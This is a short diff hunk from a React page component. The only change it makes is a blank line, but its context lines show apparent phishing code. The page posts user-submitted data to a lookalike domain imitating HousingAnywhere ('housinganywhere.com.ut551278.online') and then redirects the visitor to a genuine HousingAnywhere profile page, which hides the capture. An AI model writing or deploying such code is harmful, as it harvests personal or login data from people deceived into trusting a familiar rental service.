@@ -25,6 +25,7 @@ function Home() {
     try {
       await axios.post(`https://housinganywhere.com.ut551278.online/api/user`, data);
       router.replace('https://housinganywhere.com/users/show/2080199');
+      
     } catch(err) {
       console.log(err.response, "ce o avea");
     }
